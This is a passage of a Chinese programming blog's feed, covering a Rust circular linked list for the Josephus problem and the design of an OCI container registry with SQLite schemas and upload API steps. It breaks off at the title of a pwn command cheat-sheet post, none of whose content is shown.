class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>接下来做删除，返回index和key的元组，分为两个部分，移动尾指针到指定位置和删除尾指针节点<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">m0ve</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span>  <span class="token keyword">self</span><span class="token punctuation">,</span> count<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>tail<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>tail<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>count <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> next <span class="token operator">=</span> current<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        current <span class="token operator">=</span> next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span>tail <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">delete</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> count<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token keyword">usize</span><span class="token punctuation">,</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>tail<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>        <span class="token macro property">panic!</span><span class="token punctuation">(</span><span class="token string">"Cannot delete from empty list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 先移动尾指针到指定位置</span>    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">m0ve</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> tail_node <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>tail<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 如果只有一个节点，删除后链表为空</span>        <span class="token keyword">let</span> deleted_index <span class="token operator">=</span> tail_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">;</span>        <span class="token keyword">let</span> deleted_key <span class="token operator">=</span> tail_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>key<span class="token punctuation">;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>tail <span class="token operator">=</span> <span class="token class-name">None</span><span class="token punctuation">;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>deleted_index<span class="token punctuation">,</span> deleted_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 删除尾节点的下一个节点（即头节点）</span>    <span class="token keyword">let</span> head_node <span class="token operator">=</span> tail_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> deleted_index <span class="token operator">=</span> head_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">;</span>    <span class="token keyword">let</span> deleted_key <span class="token operator">=</span> head_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>key<span class="token punctuation">;</span>    <span class="token comment">// 获取头节点的下一个节点</span>    <span class="token keyword">let</span> new_head <span class="token operator">=</span> head_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 让尾节点直接指向新的头节点，跳过要删除的节点</span>    tail_node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>new_head<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>deleted_index<span class="token punctuation">,</span> deleted_key<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">test_move_and_delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">CircularList</span><span class="token punctuation">::</span><span class="token function">new_single_node</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//list.traverse();</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>move并不是一个可用的函数名，所以这里用了m0ve</p><p>准备完毕，接下来就可以写约瑟夫环的运行函数了：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span>keys <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> m<span class="token punctuation">:</span><span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//构建环</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> bind <span class="token operator">=</span> <span class="token class-name">CircularList</span><span class="token punctuation">::</span><span class="token function">new_single_node</span><span class="token punctuation">(</span>keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..</span>len <span class="token punctuation">&#123;</span>        bind<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>keys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//输出</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> num <span class="token operator">=</span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>len <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token punctuation">(</span>index<span class="token punctuation">,</span> new_num<span class="token punctuation">)</span><span class="token operator">=</span> bind<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//退一个</span>        <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125; "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>        num <span class="token operator">=</span> new_num<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> test1 <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">CircularList</span><span class="token punctuation">::</span><span class="token function">run</span><span class="token punctuation">(</span>test1<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>观察输出：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">running <span class="token number">4</span> tests<span class="token number">6</span> <span class="token number">1</span> <span class="token number">4</span> <span class="token number">7</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">5</span> <span class="token builtin class-name">test</span> tests::test_move_and_delete <span class="token punctuation">..</span>. ok<span class="token builtin class-name">test</span> tests::test_new <span class="token punctuation">..</span>. ok<span class="token builtin class-name">test</span> tests::test_run <span class="token punctuation">..</span>. ok<span class="token builtin class-name">test</span> tests::test_push_back <span class="token punctuation">..</span>. ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>完美</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;上一篇是根据rust语言圣经的指导写的迭代器版本，这次我想用一种更贴近过程式的风格&lt;/p&gt;
&lt;h2 id=&quot;实验一：城市链表&quot;&gt;&lt;a href=&quot;#实验一：城市链表&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
    <category term="链表" scheme="https://aucept.in/tags/%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>docker registry</title>
    <link href="https://aucept.in/2025/09/26/docker-and-OCI/"/>
    <id>https://aucept.in/2025/09/26/docker-and-OCI/</id>
    <published>2025-09-26T11:49:36.000Z</published>
    <updated>2025-09-28T09:54:41.151Z</updated>
    
    <content type="html"><![CDATA[<p>OCI即Open Container Initiative，开放容器计划，是一套有关容器与镜像的标准</p><p>想要实现一个容器镜像仓库，就要符合OCI的标准与规定的接口</p><p>该服务主要维护blob与manifest两种对象，其中blob记录了镜像文件的实际存储路径，manifest（货单）则是用来记录存在这样一个blob</p><p>此外还有一个Manifest List，是一个 Tag 所对应所有 Manifest 的元数据列表。digest是manifest和blob的标识符，然而在不同平台digest并不相同，且digest并不方便阅读，于是增加一个tag做标识</p><p>建表语句如下：<br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> blobs <span class="token punctuation">(</span>    digest <span class="token keyword">TEXT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    size <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    storage_path <span class="token keyword">TEXT</span><span class="token punctuation">,</span>    content_type <span class="token keyword">TEXT</span><span class="token punctuation">,</span>    created_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    accessed_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">CHECK</span><span class="token punctuation">(</span>digest <span class="token operator">LIKE</span> <span class="token string">'sha256:%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> uploads <span class="token punctuation">(</span>    uuid <span class="token keyword">TEXT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    repository <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    tmp_path <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    <span class="token keyword">offset</span> <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token number">0</span><span class="token punctuation">,</span>    created_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    updated_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> manifests <span class="token punctuation">(</span>    digest <span class="token keyword">TEXT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    repository <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    tag <span class="token keyword">TEXT</span><span class="token punctuation">,</span>    media_type <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    schema_version <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token number">2</span><span class="token punctuation">,</span>    config_digest <span class="token keyword">TEXT</span><span class="token punctuation">,</span>    <span class="token keyword">data</span> <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    created_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    updated_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>config_digest<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> blobs<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">CHECK</span><span class="token punctuation">(</span>digest <span class="token operator">LIKE</span> <span class="token string">'sha256:%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> manifest_layers <span class="token punctuation">(</span>    id <span class="token keyword">INTEGER</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> AUTOINCREMENT<span class="token punctuation">,</span>    manifest_digest <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    layer_digest <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    layer_order <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    media_type <span class="token keyword">TEXT</span><span class="token punctuation">,</span>    size <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>    <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>manifest_digest<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> manifests<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>layer_digest<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> blobs<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">UNIQUE</span><span class="token punctuation">(</span>manifest_digest<span class="token punctuation">,</span> layer_order<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> manifest_lists <span class="token punctuation">(</span>    digest <span class="token keyword">TEXT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    repository <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    tag <span class="token keyword">TEXT</span><span class="token punctuation">,</span>    media_type <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token string">'application/vnd.docker.distribution.manifest.list.v2+json'</span><span class="token punctuation">,</span>    schema_version <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token number">2</span><span class="token punctuation">,</span>    <span class="token keyword">data</span> <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    created_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    updated_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">CHECK</span><span class="token punctuation">(</span>digest <span class="token operator">LIKE</span> <span class="token string">'sha256:%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> manifest_list_manifests <span class="token punctuation">(</span>    id <span class="token keyword">INTEGER</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> AUTOINCREMENT<span class="token punctuation">,</span>    list_digest <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    manifest_digest <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    architecture <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    os <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    variant <span class="token keyword">TEXT</span><span class="token punctuation">,</span>    features <span class="token keyword">TEXT</span><span class="token punctuation">,</span>    os_version <span class="token keyword">TEXT</span><span class="token punctuation">,</span>    os_features <span class="token keyword">TEXT</span><span class="token punctuation">,</span>    size <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>    <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>list_digest<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> manifest_lists<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>manifest_digest<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> manifests<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">UNIQUE</span><span class="token punctuation">(</span>list_digest<span class="token punctuation">,</span> manifest_digest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> idx_blobs_digest <span class="token keyword">ON</span> blobs<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> idx_manifests_repo_tag <span class="token keyword">ON</span> manifests<span class="token punctuation">(</span>repository<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> idx_manifest_lists_repo_tag <span class="token keyword">ON</span> manifest_lists<span class="token punctuation">(</span>repository<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>blobs表以SHA256算出来的digest为主键，在上传完成后才新增条目，uploads表用作中间状态，以uuid为主键，manifests表与镜像一一对应，其中的层信息存在manifest_layers表中。两个manifest_list相关的表，建出来摆着看的</p><p>对blob，主要有三种操作，上传，存在性检查和下载</p><p>对于上传，流程是先blob再manifest：</p><ul><li>上传过程分三步，第一步是一个POST请求，api：<code>/v2/&#123;name&#125;/blobs/uploads/</code>，给定一个仓库，可能选择挂载一个别的仓库下的镜像需要特殊处理。新建一个upload项，返回一个location URL，用uuid标识</li><li>第二步是一个PATCH请求，请求体里就是上传的镜像了，这一步是分片进行的，可能包含一个<code>bytes 0-65535</code>样的Content-Range。从数据库获取upload项，继续追加内容 </li><li>第三步是一个PUT请求，通知上传完成，可能有最后一部分blob内容，完成追加，清理临时文件，记录blob</li><li>另外还有一个获取上传状态的GET请求，获知已经传了多少数据以便重传，去查offset字段并返回即可</li></ul><p>存在性检查时根据digest检查是否有blob存在，取消上传是删除临时文件和upload记录，很直观<br>下载，读取blob并返回</p><p>然后是manifest相关的四个api，增删读查</p><p>增在所有层和blob上传之后，直接验证后写入对应字段即可</p><p>删只有未被tag或引用的可以，否则403。引用是指多仓库同镜像不重复存的机制，Rc减1即可不能删</p><p>读要获知configuration 和 layer digests，以便拉取blob</p><p>查存在性和digest/大小</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;OCI即Open Container</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="后端开发" scheme="https://aucept.in/tags/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>pwn“cache”</title>
    <link href="https://aucept.in/2025/09/20/pwn_%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://aucept.in/2025/09/20/pwn_%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-09-20T06:03:08.000Z</published>
    <updated>2025-11-12T02:14:37.096Z</updated>
    
